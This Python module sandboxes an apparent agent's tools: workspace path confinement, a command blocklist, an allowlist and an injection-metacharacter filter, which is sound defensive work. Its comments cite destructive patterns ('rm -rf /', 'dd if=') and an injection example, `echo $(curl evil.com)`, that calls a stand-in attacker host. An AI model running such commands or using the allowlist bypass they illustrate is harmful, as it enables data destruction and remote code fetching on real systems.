"""
Sandbox - 沙盒路径校验

sandbox=true 时，文件操作的路径必须限定在 workspace root 内。

注意：sandbox 只约束「文件路径」，不约束 exec 的命令参数。
exec 的命令通过 blocked_commands（黑名单）+ allowed_commands（可选白名单）控制。
要真正限制可执行程序，请在 config 中配置 allowed_commands。
"""

import re
import shlex
from pathlib import Path


# ── 文件操作共享常量 ──────────────────────────────────────
MAX_FILE_SIZE = 10 * 1024 * 1024   # 10MB — read_file / grep 共用

# 链式/管道操作符，用于把命令串拆成子命令再逐个校验程序名
_CMD_SPLIT_RE = re.compile(r"&&|\|\||;|\|")
# 前导环境变量赋值，如 FOO=bar cmd ...
_ENV_ASSIGN_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")

# 能在 shell 中"启动额外程序"的元字符——白名单启用时必须先拦掉它们，
# 否则攻击者可让 argv[0] 落在白名单内、却在 argv 之外偷偷执行任意程序：
#   命令分隔符：换行/回车、单个 &（后台执行下一条）
#   命令替换：$() 与反引号 `
# 不拦：管道 | / && / || / ;（已由 _CMD_SPLIT_RE 拆分后逐段校验）、
#       变量 $VAR、重定向 </>（不启动新程序；文件越界由 sandbox 路径校验另管）。
_COMMAND_INJECTION_RE = re.compile(r"[\n\r`]|\$\(|(?<!&)&(?!&)")


def resolve_path(path: str, workspace_root: str, sandbox: bool) -> Path:
    """解析路径，sandbox 模式下验证在 workspace 内。

    被 file_tools / search_tools 等所有文件工具共用。
    """
    p = Path(path)
    if not p.is_absolute():
        p = Path(workspace_root) / p
    p = p.resolve()

    allowed, reason = check_path(str(p), workspace_root, sandbox)
    if not allowed:
        raise ValueError(reason)

    return p


def check_path(path: str, root: str, sandbox: bool) -> tuple[bool, str]:
    """
    检查路径是否在沙盒范围内。

    Returns:
        (allowed, reason) — allowed=True 表示放行，reason 为空。
        allowed=False 表示拒绝，reason 是原因说明。
    """
    if not sandbox:
        return True, ""

    resolved = Path(path).resolve()
    root_resolved = Path(root).resolve()

    try:
        resolved.relative_to(root_resolved)
        return True, ""
    except ValueError:
        return False, f"Path '{path}' is outside workspace '{root}'"


def check_command(command: str, blocked_commands: list[str]) -> tuple[bool, str]:
    """
    检查命令是否在黑名单中。

    匹配规则：
    1. 首词精确匹配（单词条目如 "rm"、"mkfs"）
    2. 多词条目在整个命令中子串匹配（如 "rm -rf /"、"dd if="）

    Returns:
        (allowed, reason)
    """
    import shlex
    try:
        parts = shlex.split(command)
    except ValueError:
        parts = command.split()
    base = parts[0].lower() if parts else ""
    command_lower = command.lower()

    for blocked in blocked_commands:
        blocked_lower = blocked.lower().strip()
        if not blocked_lower:
            continue
        # 首词精确匹配（单词条目，如 "rm" 匹配 "rm file.txt"）
        if base == blocked_lower:
            return False, f"Blocked command: '{blocked}'"
        # 多词条目：在整个命令中子串匹配（如 "rm -rf /" 匹配 "rm -rf / --no-preserve-root"）
        if " " in blocked_lower and blocked_lower in command_lower:
            return False, f"Blocked command pattern: '{blocked}'"
    return True, ""


def extract_programs(command: str) -> list[str]:
    """从命令串中提取每个子命令的可执行程序名（argv[0]）。

    用于白名单校验：把 `git pull && pytest -q` 拆成 ["git", "pytest"]。
    处理链式/管道操作符分割、前导 VAR=val 赋值、路径前缀（/usr/bin/git → git）。
    """
    programs = []
    for sub in _CMD_SPLIT_RE.split(command):
        sub = sub.strip()
        if not sub:
            continue
        try:
            tokens = shlex.split(sub)
        except ValueError:
            tokens = sub.split()
        # 跳过前导环境变量赋值（FOO=bar cmd ...）
        while tokens and _ENV_ASSIGN_RE.match(tokens[0]):
            tokens.pop(0)
        if not tokens:
            continue
        # 去掉路径前缀：/usr/bin/git → git；./foo → foo
        programs.append(tokens[0].rsplit("/", 1)[-1])
    return programs


def check_command_allowlist(command: str, allowed_commands: list[str]) -> tuple[bool, str]:
    """白名单校验：allowed_commands 非空时，命令中每个程序名都必须在白名单内。

    与黑名单叠加使用（先黑名单后白名单）。空列表 = 不启用白名单（保持原行为）。

    安全保证：白名单启用时先拒绝任何能"启动额外程序"的 shell 元字符
    （命令分隔符：换行/回车/单个&；命令替换：$() 和反引号），否则攻击者可让
    argv[0] 落在白名单内却执行白名单外的程序，例如 `echo $(curl evil.com)`。
    """
    if not allowed_commands:
        return True, ""

    # 严格模式前置闸：拒绝命令注入元字符（绕过 argv[0] 校验的语法）
    m = _COMMAND_INJECTION_RE.search(command)
    if m:
        return False, (
            f"Rejected shell metacharacter {m.group()!r} under allowlist "
            f"(it can launch programs outside allowed_commands)"
        )

    allowed = {a.lower().strip() for a in allowed_commands if a and a.strip()}
    for prog in extract_programs(command):
        if prog.lower() not in allowed:
            return False, f"Command '{prog}' is not in the allowed_commands whitelist"
    return True, ""
